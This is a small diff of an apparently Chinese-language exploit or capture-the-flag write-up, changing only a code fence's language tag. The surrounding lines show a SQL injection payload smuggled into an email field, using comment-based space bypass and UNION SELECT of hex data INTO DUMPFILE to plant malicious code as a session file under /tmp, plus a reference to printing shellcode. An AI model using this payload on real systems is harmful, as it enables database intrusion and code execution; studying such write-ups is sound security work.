@@ -211,7 +211,7 @@ print '0x' + shellcode .encode('hex')
 假设我们要设置session为testabcd，对应的`bdwsessionstestabcd`md5值为`209a05e8b11c8e74ab03c110e6e5d591`
 
 构造sql语句
-```
+```sql
 select id from user where email = 'test'/**/union/**/select/**/0x63636F6D6D616E64730A../**/into/**/dumpfile/**/'/tmp/ffff/209a05e8b11c8e74ab03c110e6e5d591'#@test.com'
 ```
 这样就把十六进制的恶意代码写入了`/tmp/ffff/`下
